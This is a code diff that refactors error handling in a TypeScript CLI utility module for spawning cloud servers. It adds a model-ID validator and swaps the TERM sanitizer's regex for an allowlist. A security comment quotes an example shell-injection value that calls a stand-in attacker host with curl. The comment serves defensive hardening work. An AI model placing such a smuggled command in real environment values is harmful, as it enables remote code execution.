@@ -3,7 +3,9 @@
 
 import { readFileSync } from "node:fs";
 import * as p from "@clack/prompts";
+import { parseJsonObj } from "./parse";
 import { getSpawnCloudConfigPath } from "./paths";
+import { asyncTryCatch, isFileError, tryCatch, tryCatchIf, unwrapOr } from "./result.js";
 import { isString } from "./type-guards";
 
 const RED = "\x1b[0;31m";
@@ -73,17 +75,19 @@ export async function prompt(question: string): Promise<string> {
     };
   });
 
-  try {
-    const result = await Promise.race([
+  const r = await asyncTryCatch(() =>
+    Promise.race([
       p.text({
         message,
       }),
       stdinClosePromise,
-    ]);
-    return p.isCancel(result) ? "" : (result || "").trim();
-  } finally {
-    cleanupStdinListener?.();
+    ]),
+  );
+  cleanupStdinListener?.();
+  if (!r.ok) {
+    throw r.error;
   }
+  return p.isCancel(r.data) ? "" : (r.data || "").trim();
 }
 
 /**
@@ -158,8 +162,8 @@ export function openBrowser(url: string): void {
 
   let opened = false;
   for (const [cmd, args] of cmds) {
-    try {
-      const result = Bun.spawnSync(
+    const r = tryCatch(() =>
+      Bun.spawnSync(
         [
           cmd,
           ...args,
@@ -171,13 +175,11 @@ export function openBrowser(url: string): void {
             "ignore",
           ],
         },
-      );
-      if (result.exitCode === 0) {
-        opened = true;
-        break;
-      }
-    } catch {
-      // command not found or failed to spawn — try next
+      ),
+    );
+    if (r.ok && r.data.exitCode === 0) {
+      opened = true;
+      break;
     }
   }
 
@@ -232,19 +234,23 @@ export async function withRetry<T>(
  * Returns null if the file is missing, unreadable, or the token is invalid.
  */
 export function loadApiToken(cloud: string): string | null {
-  try {
-    const data = JSON.parse(readFileSync(getSpawnCloudConfigPath(cloud), "utf-8"));
-    const token = (isString(data.api_key) ? data.api_key : "") || (isString(data.token) ? data.token : "");
-    if (!token) {
-      return null;
-    }
-    if (!/^[a-zA-Z0-9._/@:+=, -]+$/.test(token)) {
-      return null;
-    }
-    return token;
-  } catch {
-    return null;
-  }
+  return unwrapOr(
+    tryCatchIf(isFileError, () => {
+      const data = parseJsonObj(readFileSync(getSpawnCloudConfigPath(cloud), "utf-8"));
+      if (!data) {
+        return null;
+      }
+      const token = (isString(data.api_key) ? data.api_key : "") || (isString(data.token) ? data.token : "");
+      if (!token) {
+        return null;
+      }
+      if (!/^[a-zA-Z0-9._/@:+=, -]+$/.test(token)) {
+        return null;
+      }
+      return token;
+    }),
+    null,
+  );
 }
 
 /** JSON-escape a string (returns the quoted JSON string). */
@@ -269,6 +275,11 @@ export function validateServerName(name: string): boolean {
 /** Validate region name: 1-63 chars, alphanumeric + dash + underscore. */
 export function validateRegionName(region: string): boolean {
   return /^[a-zA-Z0-9_-]{1,63}$/.test(region);
+}
+
+/** Validate model ID: provider/model format, alphanumeric + slash + dash + dot + underscore + colon. */
+export function validateModelId(id: string): boolean {
+  return /^[a-zA-Z0-9][a-zA-Z0-9_.:-]*\/[a-zA-Z0-9][a-zA-Z0-9_.:-]*$/.test(id);
 }
 
 /** Convert display name to kebab-case. */
@@ -332,11 +343,26 @@ export async function promptSpawnNameShared(cloudLabel: string): Promise<void> {
   logInfo(`Using resource name: ${kebab}`);
 }
 
+/** Known-safe TERM values — defense-in-depth allowlist. */
+const SAFE_TERMS = new Set([
+  "xterm-256color",
+  "xterm",
+  "screen-256color",
+  "screen",
+  "tmux-256color",
+  "tmux",
+  "linux",
+  "vt100",
+  "vt220",
+  "dumb",
+]);
+
 /** Sanitize TERM value before interpolating into shell commands.
  *  SECURITY: Prevents shell injection via malicious TERM env vars
- *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server). */
+ *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server).
+ *  Uses an explicit allowlist of known-safe values instead of a regex. */
 export function sanitizeTermValue(term: string): string {
-  if (/^[a-zA-Z0-9._-]+$/.test(term)) {
+  if (SAFE_TERMS.has(term)) {
     return term;
   }
   return "xterm-256color";
@@ -359,11 +385,7 @@ export function prepareStdinForHandoff(): void {
   // Reset raw mode so the terminal is in cooked mode before SSH takes over.
   // SSH will set its own terminal mode when it starts.
   if (process.stdin.isTTY) {
-    try {
-      process.stdin.setRawMode(false);
-    } catch {
-      // ignore — not a TTY or already closed
-    }
+    tryCatch(() => process.stdin.setRawMode(false));
   }
 
   // Stop the stream from reading, but do NOT destroy it (that can close fd 0).
